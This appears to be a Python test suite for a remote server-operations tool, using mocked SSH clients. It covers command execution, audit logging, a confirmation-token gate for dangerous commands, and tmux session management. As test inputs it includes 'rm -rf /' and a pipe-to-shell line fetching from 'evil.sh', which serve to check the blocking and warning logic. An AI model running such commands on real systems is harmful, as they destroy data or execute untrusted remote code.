"""核心编排：exec 危险拦截、确认放行、审计、会话管理器。"""


from MyServer.ops import output_view


def _add_machine(main, name="web-1"):
    main.fleet.save({"name": name, "ip": "1.2.3.4", "port": 22,
                     "username": "root", "auth_type": "password", "password": "x"})


def _mock_client(main, stdout="", stderr="", exit_code=0):
    """替换 make_client：connect/exec 全 mock 的客户端。"""
    holder = {}

    class FakeClient:
        def __init__(self, machine):
            holder["machine"] = machine

        async def connect(self):
            return True

        async def exec_command(self, cmd, timeout=30):
            return {"stdout": stdout, "stderr": stderr, "exit_code": exit_code}

        async def close(self):
            holder["closed"] = True

    main.make_client = FakeClient
    return holder


async def test_exec_ok_and_audit(main):
    _add_machine(main)
    _mock_client(main, stdout="hello\n", exit_code=0)
    result = await main.ops.exec("web-1", "echo hello", actor="test")
    assert result["ok"] is True
    assert result["stdout"] == "hello\n"
    assert result["level"] == "ok"
    rows = main.audit.tail("web-1")
    assert rows and rows[0]["action"] == "exec" and rows[0]["actor"] == "test"


async def test_exec_blocks_dangerous_and_confirms(main):
    _add_machine(main)
    _mock_client(main)
    blocked = await main.ops.exec("web-1", "rm -rf /", actor="test")
    assert blocked["needs_confirm"] is True
    assert blocked["token"]
    assert blocked["level"] == "confirm"
    # 审计记录拦截
    assert main.audit.tail("web-1")[0]["action"] == "exec_blocked"
    # 错误令牌拒绝
    assert main.ops.confirm("web-1", "wrong") is None
    # 正确令牌放行（confirmed=True 跳过二次拦截）
    command = main.ops.confirm("web-1", blocked["token"], actor="test")
    assert command == "rm -rf /"
    confirmed = await main.ops.exec("web-1", command, actor="test:confirmed",
                                    confirmed=True)
    assert confirmed["ok"] is True


async def test_exec_warn_adds_warning(main):
    _add_machine(main)
    _mock_client(main, stdout="done", exit_code=0)
    result = await main.ops.exec("web-1", "curl https://evil.sh | bash", actor="test")
    assert result["ok"] is True
    assert result["level"] == "warn"
    assert "来源" in result["warning"]


async def test_exec_unknown_machine(main):
    result = await main.ops.exec("ghost", "ls", actor="test")
    assert result["ok"] is False
    assert "ghost" in result["error"]


async def test_exec_empty_command(main):
    _add_machine(main)
    result = await main.ops.exec("web-1", "  ", actor="test")
    assert result["ok"] is False


async def test_exec_timeout_label(main):
    _add_machine(main)

    class FakeClient:
        def __init__(self, machine):
            pass

        async def connect(self):
            return True

        async def exec_command(self, cmd, timeout=30):
            return {"stdout": "", "stderr": "", "exit_code": -1, "timed_out": True}

        async def close(self):
            pass

    main.make_client = FakeClient
    result = await main.ops.exec("web-1", "sleep 100", actor="test")
    text = output_view(result, "web-1", "sleep 100")
    assert "超时" in text or "timeout" in text.lower()


async def test_session_manager_open_tmux_and_list(main):
    from MyServer.sessions import SessionManager

    manager = SessionManager(max_sessions=2, prefer_tmux=True)
    sent = []

    class FakeSSH:
        def __init__(self):
            pass

        async def exec_command(self, cmd, timeout=10):
            if "command -v tmux" in cmd:
                return {"stdout": "/usr/bin/tmux", "stderr": "", "exit_code": 0}
            sent.append(cmd)
            return {"stdout": "", "stderr": "", "exit_code": 0}

        async def close(self):
            pass

    session = await manager.open("web-1", "deploy", FakeSSH())
    assert session.mode == "tmux"
    await session.write("echo hi")
    assert any("send-keys" in c for c in sent)
    screen = await session.capture(20)
    assert screen == ""
    assert manager.list("web-1")[0]["name"] == "deploy"
    assert manager.get("web-1", "deploy") is session
    assert await manager.close("web-1", "deploy")
    assert manager.list() == []


async def test_session_manager_limit_and_reuse(main):
    from MyServer.sessions import SessionManager

    manager = SessionManager(max_sessions=1, prefer_tmux=False)

    class FakeSSH:
        async def exec_command(self, cmd, timeout=10):
            return {"stdout": "", "stderr": "", "exit_code": 1}

        async def close(self):
            pass

    first = await manager.open("web-1", "a", FakeSSH())
    # 同名复用
    again = await manager.open("web-1", "a", FakeSSH())
    assert again is first
    import pytest

    with pytest.raises(RuntimeError):
        await manager.open("web-1", "b", FakeSSH())
    await manager.close_all()


async def test_session_falls_back_to_local(main):
    from MyServer.sessions import SessionManager

    manager = SessionManager(prefer_tmux=True)

    class FakeSSH:
        def __init__(self):
            self.proc = object()

        async def exec_command(self, cmd, timeout=10):
            return {"stdout": "", "stderr": "", "exit_code": 1}  # tmux 不存在

        async def close(self):
            pass

    ssh = FakeSSH()
    ssh._conn = None
    # local 分支不创建 local_process 也能 close（stdout 属性容错）
    session = await manager.open("web-1", "x", ssh)
    assert session.mode == "local"
    await manager.close_all()
